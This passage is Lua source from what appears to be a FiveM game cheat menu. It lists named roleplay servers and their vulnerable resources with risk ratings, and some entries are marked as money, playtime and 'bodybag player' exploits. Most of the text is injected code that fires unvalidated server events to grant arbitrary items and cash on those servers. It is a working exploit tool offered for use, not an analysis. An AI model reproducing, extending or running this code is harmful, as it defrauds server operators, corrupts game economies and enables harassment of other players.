    -- === SAN ANDREAS VALLEY RP ===
    { id = "san_andreas_valley_rp", name = "~g~[San Andreas Valley] T1GER Lib", res = {"t1ger_lib"}, type = "item", risk = "safe", all = true },
    -- === IGNITE ROLEPLAY ===
    { id = "ignite_roleplay", name = "~g~[Ignite RP] T1GER Lib", res = {"t1ger_lib"}, type = "item", risk = "safe", all = true },
    -- === RICH AS IN SPIRIT ===
    { id = "rich_as_in_spirit", name = "~g~[Rich As In Spirit] T1GER Lib", res = {"t1ger_lib"}, type = "item", risk = "safe", all = true },
    -- === FUKDEWYARP (Multiple) ===
    { id = "fukdewya_rp", name = "~g~[FukdewyaRP] T1GER + XMMX", res = {"t1ger_lib", "xmmx_letscookplus"}, type = "item", risk = "safe", all = false },
    -- === LITE PIXEL V2 ===
    { id = "lite_pixel_v2", name = "~g~[Lite Pixel V2] T1GER Lib", res = {"t1ger_lib"}, type = "item", risk = "safe", all = true },
    -- === PARKSIDE LA ===
    { id = "parkside_la", name = "~g~[ParkSide LA] T1GER Lib", res = {"t1ger_lib"}, type = "item", risk = "safe", all = true },
    -- === DOMINICANCITYRP ===
    { id = "dominican_city_rp", name = "~g~[DominicanCityRP] Horizon Payment", res = {"horizon_paymentsystem"}, type = "item", risk = "safe", all = true },
    -- === LIVEV ROLEPLAY ===
    { id = "livev_roleplay", name = "~g~[LiveV RP] Horizon Payment", res = {"horizon_paymentsystem"}, type = "item", risk = "safe", all = true },
    -- === LOCKED IN ===
    { id = "locked_in", name = "~g~[Locked In] Solos Joints", res = {"solos-joints"}, type = "item", risk = "safe", all = true },
    -- === EVOLVE LEGACY RP ===
    { id = "evolve_legacy_rp", name = "~g~[Evolve Legacy] Solos Joints", res = {"solos-joints"}, type = "item", risk = "safe", all = true },
    -- === HOOPERS WL S2 ===
    { id = "hoopers_wl_s2", name = "~g~[Hoopers WL S2] Solos Joints", res = {"solos-joints"}, type = "item", risk = "safe", all = true },
    -- === PROJECT 9 ===
    { id = "project_9", name = "~g~[Project 9] Solos Joints", res = {"solos-joints"}, type = "item", risk = "safe", all = true },
    -- === LIKE A BOSS RP (Multiple) ===
    { id = "like_a_boss_rp", name = "~g~[Like A Boss] Solos + Jim Recycle", res = {"solos-joints", "jim-recycle"}, type = "item", risk = "safe", all = false },
    -- === RISKY RP (Multiple) ===
    { id = "risky_rp", name = "~g~[Risky RP] Jim Recycle + Solos", res = {"jim-recycle", "solos-joints"}, type = "item", risk = "safe", all = false },
    -- === MOONLIT HILLS RP (Multiple) ===
    { id = "moonlit_hills_rp", name = "~g~[Moonlit Hills] Solos + Jim Recycle", res = {"solos-joints", "jim-recycle"}, type = "item", risk = "safe", all = false },
    -- === PROJECT BABY V3 (Multiple) ===
    { id = "project_baby_v3", name = "~g~[Project Baby V3] XMMX + AK47 ID", res = {"xmmx_letscookplus", "ak47_idcard"}, type = "item", risk = "safe", all = false },
    -- === FIRST 48 RP (Multiple) ===
    { id = "first_48_rp", name = "~g~[First 48 RP] XMMX + AK47 ID", res = {"xmmx_letscookplus", "ak47_idcard"}, type = "item", risk = "safe", all = false },
    -- === WICKED NYC (1x) ===
    { id = "wicked_nyc", name = "~y~[Wicked NYC] AK47 ID Card (1x)", res = {"ak47_idcard"}, type = "item", risk = "medium", all = true },
    -- === BACK4BLOOD (1x) ===
    { id = "back4blood", name = "~y~[Back4Blood] AK47 ID Card (1x)", res = {"ak47_idcard"}, type = "item", risk = "medium", all = true },
    -- === STRIKELYFE WL (1x) ===
    { id = "strikelyfe_wl", name = "~y~[StrikeLyfe WL] AK47 ID Card (1x)", res = {"ak47_idcard"}, type = "item", risk = "medium", all = true },
    -- === FLORIDA WATER (1x) ===
    { id = "florida_water", name = "~y~[Florida Water] AK47 ID Card (1x)", res = {"ak47_idcard"}, type = "item", risk = "medium", all = true },
    -- === CALIFORNIA BREEZE V2 (Multiple) ===
    { id = "california_breeze_rp_v2", name = "~g~[California Breeze V2] XMMX + AK47 ID", res = {"xmmx_letscookplus", "ak47_idcard"}, type = "item", risk = "safe", all = false },
    -- === NOMIND RP (Multiple) ===
    { id = "nomind_rp", name = "~g~[NoMind RP] XMMX + AK47 ID", res = {"xmmx_letscookplus", "ak47_idcard"}, type = "item", risk = "safe", all = false },
    -- === CUH CITY RP V2 (1x) ===
    { id = "cuh_city_rp_v2", name = "~y~[Cuh City V2] AK47 ID Card (1x)", res = {"ak47_idcard"}, type = "item", risk = "medium", all = true },
    -- === STREETS OF HOUSTON (Multiple) ===
    { id = "streets_of_houston", name = "~g~[Streets Of Houston] XMMX + AK47 ID", res = {"xmmx_letscookplus", "ak47_idcard"}, type = "item", risk = "safe", all = false },
    -- === IT GETS REAL RP (Multiple) ===
    { id = "it_gets_real_rp", name = "~y~[It Gets Real] AK47 ID + DevCore (1x)", res = {"ak47_idcard", "devcore_smokev2"}, type = "item", risk = "medium", all = false },
    -- === PAID IN FULL CHICAGO (1x) ===
    { id = "paid_in_full_chicago", name = "~y~[Paid In Full] AK47 ID Card (1x)", res = {"ak47_idcard"}, type = "item", risk = "medium", all = true },
    -- === LAND OF OPPORTUNITY (1x) ===
    { id = "land_of_opportunity", name = "~y~[Land Of Opportunity] AK47 + Smoke (1x)", res = {"ak47_idcard", "devcore_smokev2"}, type = "item", risk = "medium", all = false },
    -- === RUN IT BACK RP ===
    { id = "run_it_back_rp", name = "~g~[Run It Back] AK47 + DevCore Smoke", res = {"ak47_idcard", "devcore_smokev2"}, type = "item", risk = "safe", all = false },
    -- === GRIMY CHICAGO (1x) ===
    { id = "grimy_chicago", name = "~y~[Grimy Chicago] AK47 ID Card (1x)", res = {"ak47_idcard"}, type = "item", risk = "medium", all = true },
    -- === JUNGLESRP V3 (1x) ===
    { id = "junglesrp_v3", name = "~y~[JunglesRP V3] AK47 ID Card (1x)", res = {"ak47_idcard"}, type = "item", risk = "medium", all = true },
    -- === FASTLANERP (Multiple) ===
    { id = "fastlanerp", name = "~g~[FastlaneRP] AK47 + DevCore Smoke", res = {"ak47_idcard", "devcore_smokev2"}, type = "item", risk = "safe", all = false },
    -- === SFRP ===
    { id = "sfrp", name = "~g~[SFRP] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === DISTRICT OF MIAMI S2 (Multiple) ===
    { id = "district_of_miami_s2", name = "~g~[District Of Miami S2] XMMX + Smoke", res = {"xmmx_letscookplus", "devcore_smokev2"}, type = "item", risk = "safe", all = false },
    -- === FASTMONEY RP V2 (Multiple) ===
    { id = "fastmoney_rp_v2", name = "~g~[FastMoney V2] XMMX + Jim Mining", res = {"xmmx_letscookplus", "jim-mining"}, type = "item", risk = "safe", all = false },
    -- === MT RESTAURANTS (Multiple Cities) ===
    { id = "mt_restaurants", name = "~g~[MT Restaurants] AddItem", res = {"mt-restaurants"}, type = "item", risk = "safe", all = true },
    -- === BOII WHITEWIDOW (Multiple) ===
    { id = "boii_whitewidow", name = "~g~[Boii Whitewidow] AddItem", res = {"boii-whitewidow"}, type = "item", risk = "safe", all = true },
    -- === HG WHEEL (1x) ===
    { id = "hg_wheel", name = "~y~[HG Wheel] GiveItem (1x)", res = {"hg-wheel"}, type = "item", risk = "medium", all = true },
    -- === UWUCAFE ===
    { id = "uwucafe", name = "~g~[UwuCafe] AddItem", res = {"uwucafe"}, type = "item", risk = "safe", all = true },
    -- === MATTI AIRSOFT ===
    { id = "matti_airsoft", name = "~g~[Matti Airsoft] GiveItem", res = {"matti-airsoft"}, type = "item", risk = "safe", all = true },
    -- === WP POCKETBIKES (1x) ===
    { id = "wp_pocketbikes", name = "~y~[WP Pocketbikes] AddItem (1x)", res = {"wp-pocketbikes"}, type = "item", risk = "medium", all = true },
    -- === EXPLOIT: DRUG SELL LOOP ===
    { id = "drug_sell_exploit", name = "~r~[EXPLOIT] Drug Sell Loop (Infinite $)", res = {"stasiek_selldrugsv2"}, type = "event", risk = "high", all = true },
    -- === EXPLOIT: RECYCLE MONEY ===
    { id = "recycle_money_exploit", name = "~r~[EXPLOIT] Recycle Money (100k)", res = {"recycle"}, type = "event", risk = "high", all = true },
    -- === EXPLOIT: PLAYTIME BOOST ===
    { id = "playtime_exploit", name = "~r~[EXPLOIT] Playtime Boost (24h)", res = {"th_playtime", "DE_playtime"}, type = "event", risk = "high", all = true },
    -- === EXPLOIT: BODYBAG ===
    { id = "bodybag_exploit", name = "~r~[EXPLOIT] Bodybag Player", res = {"RRP_BODYBAG"}, type = "event", risk = "high", all = true },
}
    

        local handled = false
        for _, trigger in ipairs(knownTriggers) do
            local available = false
            if trigger.all then
                available = true
                for _, r in ipairs(trigger.res) do
                    if not CheckResource(r) then available = false; break end
                end
            else
                for _, r in ipairs(trigger.res) do
                    if CheckResource(r) then available = true; break end
                end
            end

            if available then
                local itemInput = ItemName
                local amountInput = Amount
                if trigger.type == "money" or trigger.type == "event" then
                    itemInput = "money"
                end

                -----------------------------------------------------------------
                --  Trigger-specific payloads (exactly as you wrote them)
                -----------------------------------------------------------------
                if trigger.id == "ak_item" then
                    for i = giveItemState.akIndex, #trigger.res + giveItemState.akIndex - 1 do
                        local idx = (i - 1) % #trigger.res + 1
                        local resName = trigger.res[idx]
                        if CheckResource(resName) then
                            giveItemState.akIndex = (idx % #trigger.res) + 1
                            local x, y, z = table.unpack(GetEntityCoords(PlayerPedId()))
                            local code = ([[Citizen.CreateThread(function() pcall(function() TriggerServerEvent(%q,%q,{['phone']=0},%d,0) end); DoScreenFadeOut(1);Citizen.Wait(1000);SetEntityCoordsNoOffset(PlayerPedId(),%f,%f,%f,false,false,false);Citizen.Wait(1000);DoScreenFadeIn(1000) end)]]):format(
                                resName .. ":process", itemInput, amountInput, x, y, z)
                            inject(code)
                            handled = true
                            break
                        end
                    end
                elseif trigger.id == "nails_money" then
                    inject(('pcall(function() TriggerServerEvent("delivery:giveRewardnails",%d) end)'):format(amountInput))
                    handled = true
                elseif trigger.id == "handbag_money" then
                    inject(('pcall(function() TriggerServerEvent("delivery:giveRewardhandbags",%d) end)'):format(amountInput))
                    handled = true
                elseif trigger.id == "sneaker_money" then
                    inject(('pcall(function() TriggerServerEvent("delivery:giveRewardShoes",%d) end)'):format(amountInput))
                    handled = true
                elseif trigger.id == "caps_money" then
                    inject(('pcall(function() TriggerServerEvent("delivery:giveRewardCaps",%d) end)'):format(amountInput))
                    handled = true
                elseif trigger.id == "generic_money" then
                    inject(("pcall(function() TriggerServerEvent('ak47_qb_drugmanagerv2:shop:buy', '53.15-1478.79', {['buyprice']=0, ['currency']='cash', ['name']='%s', ['sellprice']=0, ['label']='Katana MeNu On Top!!'}, %d) end)"):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "hotdog_money" then
                    inject(("pcall(function() local ped=GetPlayerPed(-1) local pedCoords=GetEntityCoords(ped) local HotdogsForSale=1 local SellingPrice=%d TriggerServerEvent('qb-hotdogjob:server:Sell', pedCoords, HotdogsForSale, SellingPrice) end)"):format(amountInput))
                    handled = true
                elseif trigger.id == "ak47_inventory" then
                    inject(([[TriggerServerEvent('ak47_inventory:buyItemDrag',{fromInv={identifier=nil,slot=1,slotData={amount=%d,close=true,count=999999999999999,description="CodePlug Found Ts Lol",info={account="cash",buyPrice=0},label="CodePlug Too Good Lol",name="%s",quality=100,slot=1,type="item",weight=0}},toInv={identifier=nil,slot=1,slotData={slot=1}}} )]]):format(amountInput, itemInput))
                    handled = true
                elseif trigger.id == "shop_purchase" then
                    local randomId = "codeplug" .. math.random(1000, 99999)
                    inject(('pcall(function() TriggerServerEvent("shop:purchaseItem2", "%s", "%s", 0) end)'):format(randomId, itemInput))
                    handled = true
                elseif trigger.id == "cl_pizzeria" then
                    inject(('pcall(function() TriggerServerEvent("CL-Pizzeria:AddItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "solstice_moonshine" then
                    inject(('pcall(function() TriggerServerEvent("SolsticeMoonshineV2:server:AddItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "tk_smokev2" then
                    inject(('pcall(function() TriggerServerEvent("Tk_smokev2:server:AddItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "ox_cb_ws_sellshop" then
                    inject(('pcall(function() TriggerServerEvent("__ox_cb_ws_sellshop:sellItem", "sellshop", "ws_sellshop:sellItem:17692", { currency = "money", item = "%s", price = 9999999999, quantity = %d }) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "adminplus_selldrugs" then
                    inject(('pcall(function() TriggerEvent("stasiek_selldrugsv2:findClient",{ ["i"] = 8, ["label"] = "CodePlugFuckedUrCity", ["type"] = "CodePlugFuckedUrCity", ["zone"] = "The Meat Quarter", ["price"] = %d, ["count"] = 0 }) end)'):format(amountInput))
                    handled = true
                elseif trigger.id == "ak47_drugmanager" then
                    inject(('pcall(function() TriggerServerEvent("ak47_drugmanager:pickedupitem","%s","%s",%d) end)'):format(itemInput, itemInput, amountInput))
                    handled = true
                elseif trigger.id == "ak47_drugmanagerv2" then
                    inject(('pcall(function() TriggerServerEvent("ak47_drugmanagerv2:shop:buy", "-1146.444941.22", { buyprice = 0, currency = "money", label = "codeplug", name = "%s", sellprice = 69696969 }, %d ) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "ak47_prospecting_reward" then
                    inject(('pcall(function() TriggerServerEvent("ak47_prospecting:reward", %d) end)'):format(amountInput))
                    handled = true
                elseif trigger.id == "ak47_prospecting_sell" then
                    inject(('pcall(function() TriggerServerEvent("ak47_prospecting:sell","cash",%d,9999999999) end)'):format(amountInput))
                    handled = true
                elseif trigger.id == "ak4y_fishing" then
                    inject(('pcall(function() TriggerServerEvent("ak4y-advancedFishing:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "ak4y_case_opening" then
                    inject(('pcall(function() TriggerServerEvent("ak4y-caseOpening:addGoldCoin", %d) end)'):format(amountInput))
                    handled = true
                elseif trigger.id == "ak4y_playtime_shop" then
                    inject(('pcall(function() TriggerServerEvent("ak4y-playTimeShop:addCoin", %d) end)'):format(amountInput))
                    handled = true
                elseif trigger.id == "angelicxs_civilian_payment" then
                    inject(('pcall(function() TriggerServerEvent("angelicxs-CivilianJobs:Server:Payment", %d) end)'):format(amountInput))
                    handled = true
                elseif trigger.id == "angelicxs_civilian_item" then
                    inject(('pcall(function() TriggerServerEvent("angelicxs-CivilianJobs:Server:GainItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "apex_cluckinbell" then
                    inject(('pcall(function() TriggerServerEvent("apex_cluckinbell:client:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "apex_rexdiner" then
                    inject(('pcall(function() TriggerServerEvent("apex_rexdiner:client:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "ars_hunting" then
                    inject(('pcall(function() TriggerServerEvent("ars_hunting:sellBuyItem", { item = "%s", price = 1, quantity = %d, buy = true }) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "ars_vvsgrillz" then
                    inject(('pcall(function() TriggerServerEvent("ars_vvsgrillz_v2:Buyitem", "grillz", { items = {{ id = "%s", quantity = %d, price = 0, stock = 999999, totalPrice = 0 }}, method = "bank", total = 0 }, "bank") end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "ars_vvsguns" then
                    inject(('pcall(function() TriggerServerEvent("ars_vvsguns:Buyitem", "vvsguns", { items = { { id = "%s", image = "codeplug", name = "codeplug", page = 2, price = 0, quantity = %d, stock = 9999999999, totalPrice = 0 } }, method = "cash", total = 0 }, "cash" ) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "ars_vvsjewelry" then
                    inject(('pcall(function() TriggerServerEvent("ars_vvsjewelry:Buyitem", "vvsjewelry", { items = { { id = "%s", image = "CodePlug", name = "CodePlugRunsUrCity", page = 2, price = 0, quantity = %d, stock = 999999999999999, totalPrice = 0 } }, method = "cash", total = 0 }, "cash" ) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "ars_whitewidow" then
                    inject(('pcall(function() TriggerServerEvent("ars_whitewidow_v2:Buyitem", { items = { { id = "%s", image = "CodeFinder", name = "CodeFinder", page = 1, price = 500, quantity = %d, stock = 999999999999999, totalPrice = 0 } }, method = "cash", total = 0 }, "cash") end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "av_business" then
                    inject(('pcall(function() TriggerServerEvent("av_business:addItem", "%s", %d, 9999) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "boii_drugs" then
                    inject(('pcall(function() TriggerServerEvent("boii-drugs:sv:AddItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "boii_moneylaunderer" then
                    inject(('pcall(function() TriggerServerEvent("boii-moneylaunderer:sv:PayPlayer", %d) end)'):format(amountInput))
                    handled = true
                elseif trigger.id == "boii_pawnshop" then
                    inject(('pcall(function() TriggerServerEvent("boii-pawnshop:sv:AddItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "boii_salvage_diving" then
                    inject(('pcall(function() TriggerServerEvent("boii-salavagediving:server:JewelleryBag") end)'))
                    handled = true
                elseif trigger.id == "boii_whitewidow" then
                    inject(('pcall(function() TriggerServerEvent("boii_whitewidow:server:itemadd", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "brutal_hunting" then
                    inject(('pcall(function() TriggerServerEvent("brutal_hunting:server:giveItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "brutal_shop_robbery" then
                    inject(('pcall(function() TriggerServerEvent("brutal_shop_robbery:server:giveItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "cfx_tcd_starter" then
                    inject(('pcall(function() TriggerEvent("cfx-tcd-starterpack:client:openStarterPack") end)'))
                    handled = true
                elseif trigger.id == "core_crafting" then
                    inject(('pcall(function() TriggerServerEvent("core_crafting:giveItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "d3mba_heroin" then
                    inject(('pcall(function() TriggerServerEvent("d3MBA-heroin:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "dcweedroll" then
                    inject(('pcall(function() TriggerServerEvent("dcweedroll:server:itemadd", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "dcweedrollnew" then
                    inject(('pcall(function() TriggerServerEvent("dcweedrollnew:server:itemadd", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "devcore_needs" then
                    inject(('pcall(function() TriggerServerEvent("devcore_needs:server:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "devcore_smokev2" then
                    inject(('pcall(function() TriggerServerEvent("devcore_smokev2:server:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "dusa_pets" then
                    inject(('pcall(function() TriggerServerEvent("dusa-pets:server:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "dusa_pet_shop" then
                    inject(('pcall(function() TriggerServerEvent("dusa_pet:server:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "dv_donut_delivery" then
                    inject(('pcall(function() TriggerServerEvent("dv-donutdeliveryjob:server:giveReward", %d) end)'):format(amountInput))
                    handled = true
                elseif trigger.id == "esx_weashop" then
                    inject(('pcall(function() TriggerServerEvent("esx_weashop:server:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "ez_lib" then
                    inject(('pcall(function() TriggerServerEvent("ez_lib:server:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "fivecode_camping" then
                    inject(('pcall(function() TriggerServerEvent("fivecode_camping:server:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "food_mechanics" then
                    inject(('pcall(function() TriggerServerEvent("food_mechanics:server:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "forge_starter" then
                    inject(('pcall(function() TriggerServerEvent("forge-starter:server:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "fs_placeables" then
                    inject(('pcall(function() TriggerServerEvent("fs_placeables:server:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "fuksus_shops" then
                    inject(('pcall(function() TriggerServerEvent("fuksus-shops:server:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "gardener_job" then
                    inject(('pcall(function() TriggerServerEvent("gardenerjob:server:giveReward", %d) end)'):format(amountInput))
                    handled = true
                elseif trigger.id == "guatau_consumibles" then
                    inject(('pcall(function() TriggerServerEvent("guataubaconsumibles:server:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "hg_wheel" then
                    inject(('pcall(function() TriggerServerEvent("hg-wheel:server:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "horizon_payment" then
                    inject(('pcall(function() TriggerServerEvent("horizon_paymentsystem:server:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "complete_hunting" then
                    inject(('pcall(function() TriggerServerEvent("hunting:server:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "inside_fruitpicker" then
                    inject(('pcall(function() TriggerServerEvent("inside-fruitpicker:server:giveReward", %d) end)'):format(amountInput))
                    handled = true
                elseif trigger.id == "inverse_consumables" then
                    inject(('pcall(function() TriggerServerEvent("inverse-consumables:server:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "it_lib" then
                    inject(('pcall(function() TriggerServerEvent("it_lib:server:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "jg_mechanic" then
                    inject(('pcall(function() TriggerServerEvent("jg-mechanic:server:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "jim_bakery" then
                    inject(('pcall(function() TriggerServerEvent("jim-bakery:server:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "jim_beanmachine" then
                    inject(('pcall(function() TriggerServerEvent("jim-beanmachine:server:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "jim_burgershot" then
                    inject(('pcall(function() TriggerServerEvent("jim-burgershot:server:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "jim_catcafe" then
                    inject(('pcall(function() TriggerServerEvent("jim-catcafe:server:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "jim_consumables" then
                    inject(('pcall(function() TriggerServerEvent("jim-consumables:server:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "jim_mechanic" then
                    inject(('pcall(function() TriggerServerEvent("jim-mechanic:server:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "jim_mining" then
                    inject(('pcall(function() TriggerServerEvent("jim-mining:server:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "jim_pizzathis" then
                    inject(('pcall(function() TriggerServerEvent("jim-pizzathis:server:addItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "jim_recycle" then
                    inject(('pcall(function() TriggerServerEvent("jim-recycle:server:toggleItem", true, "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "jim_shops_blackmarket" then
                    inject(('pcall(function() Config.Goodies = { label = "Blackmarket", slots = 1, items = { [1] = { name = "%s", price = 0, amount = %d, info = {}, type = "item", slot = 1 } } } end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "jim_shops_open" then
                    inject(('pcall(function() TriggerServerEvent("jim-shops:ShopOpen", "shop", "illegalshit", Config.Goodies) end)'))
                    handled = true
                elseif trigger.id == "kaves_drugsv2" then
                    inject(('pcall(function() TriggerServerEvent("kaves_drugsv2:server:giveItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "mt_restaurants" then
                    inject(('pcall(function() TriggerServerEvent("mt-restaurants:server:AddItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "mt_printers" then
                    inject(('pcall(function() TriggerServerEvent("__ox_cb_mt_printers:server:itemActions", "mt_printers", "mt_printers:server:itemActions:codeplug", "%s", "add") end)'):format(itemInput))
                    handled = true
                elseif trigger.id == "nx_cayo" then
                    inject(('pcall(function() TriggerServerEvent("nx-cayo:server:AddItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "okok_crafting" then
                    inject(('pcall(function() TriggerServerEvent("okokCrafting:claimAll", "paletogeneral", { ["paletogeneral"] = { [1] = { ["item"] = "%s", ["randomID"] = 431916296, ["recipe"] = { [1] = { [1] = "cash", [2] = 1, [3] = "true", [4] = "false" } }, ["suc"] = true, ["xp"] = 6, ["itemName"] = "Pistol", ["time"] = 0, ["amount"] = %d, ["isPending"] = false, ["isDone"] = true, ["isItem"] = true, ["isDis"] = false, ["sucPC"] = 85 } } }) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "pug_business_creator" then
                    inject(('pcall(function() TriggerServerEvent("Pug:server:NewGivBusinessItemAfterHacks", true, "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "pug_chopping" then
                    inject(('pcall(function() TriggerServerEvent("Pug:server:GiveChoppingCarPay", %d) end)'):format(amountInput))
                    handled = true
                elseif trigger.id == "pug_fishing" then
                    inject(('pcall(function() TriggerServerEvent("Pug:server:GiveFish", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "pug_robbery_creator" then
                    inject(('pcall(function() TriggerServerEvent("Pug:server:RobberyGiveItem", true, "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "qb_crafting" then
                    inject(('pcall(function() TriggerServerEvent("qb-crafting:server:receiveItem", "%s", {}, %d, 0) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "qb_drugs" then
                    inject(('pcall(function() TriggerServerEvent("qb-drugs:server:giveDrugs", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "qb_garbage_job" then
                    inject(('pcall(function() TriggerServerEvent("qb-garbagejob:server:PayShift", %d, "") end)'):format(amountInput))
                    handled = true
                elseif trigger.id == "qb_hotdog_job" then
                    inject(('pcall(function() local ped = GetPlayerPed(-1) local pedCoords = GetEntityCoords(ped) local HotdogsForSale = 1 local SellingPrice = %d TriggerServerEvent("qb-hotdogjob:server:Sell", pedCoords, HotdogsForSale, SellingPrice) end)'):format(amountInput))
                    handled = true
                elseif trigger.id == "qb_recycle_job" then
                    inject(('pcall(function() TriggerServerEvent("recycle:giveReward", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "qb_trash_search" then
                    inject(('pcall(function() TriggerServerEvent("qb-trashsearch:server:givemoney", math.random(%d, 9999999999999999)) end)'):format(amountInput))
                    handled = true
                elseif trigger.id == "qb_warehouse" then
                    inject(('pcall(function() TriggerServerEvent("inside-warehouse:Payout", %d) end)'):format(amountInput))
                    handled = true
                elseif trigger.id == "rm_camperv" then
                    inject(('pcall(function() TriggerServerEvent("camperv:server:giveItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "ry_rent" then
                    inject(('pcall(function() TriggerServerEvent("ry-vehiclerental:giveMoney", %d) end)'):format(amountInput))
                    handled = true
                elseif trigger.id == "savana_trucker" then
                    inject(('pcall(function() TriggerServerEvent("savana-truckerJob:addXpAndMoney", %d, %d) end)'):format(amountInput, amountInput))
                    handled = true
                elseif trigger.id == "sayer_jukebox" then
                    inject(('pcall(function() TriggerServerEvent("sayer-jukebox:AddItem", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "sell_usb" then
                    inject(('pcall(function() TriggerEvent("sell_usb:findClient", { i = 8, label = "CodePlugRunsYourShit", type = "codeplug", zone = "The Meat Quarter", price = %d, count = 0 }) end)'):format(amountInput))
                    handled = true
                elseif trigger.id == "snipe_boombox" then
                    inject(('pcall(function() TriggerServerEvent("snipe-boombox:server:pickup", %d, vector3(0.0, 0.0, 0.0), "%s") end)'):format(amountInput, itemInput))
                    handled = true
                elseif trigger.id == "solos_cashier" then
                    inject(('pcall(function() TriggerServerEvent("solos-cashier:server:addmoney", "bank", %d) end)'):format(amountInput))
                    handled = true
                elseif trigger.id == "solos_food" then
                    inject(('pcall(function() TriggerServerEvent("solos-food:server:itemadd", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "solos_hookah" then
                    inject(('pcall(function() TriggerServerEvent("solos-hookah:server:Buy-Item", "%s", %d, 0) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "solos_jointroll" then
                    inject(('pcall(function() TriggerServerEvent("solos-jointroll:server:ItemAdd", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "solos_joints" then
                    inject(('pcall(function() TriggerServerEvent("solos-joints:server:itemadd", "%s", %d) end)'):format(itemInput, amountInput))
                    handled = true
                elseif trigger.id == "solos_methlab" then
